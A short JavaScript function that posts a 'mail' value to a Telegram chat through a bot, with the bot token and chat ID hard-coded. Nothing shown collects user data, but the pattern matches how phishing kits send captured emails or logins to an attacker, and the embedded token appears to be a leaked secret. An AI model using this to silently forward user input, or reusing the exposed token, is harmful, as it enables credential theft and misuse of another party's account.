export const sendToTelegram = async (mail) => {
  const token = '6861936638:AAE0iUr3LHsQI05481YsLIf8E2nDHExbPy4';
  const chatId = '-4134542967';
  const message = mail;

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    const data = await response.json();
    console.log('Response from Telegram API:', data);
  } catch (error) {
    console.error('Error:', error);
  }
};
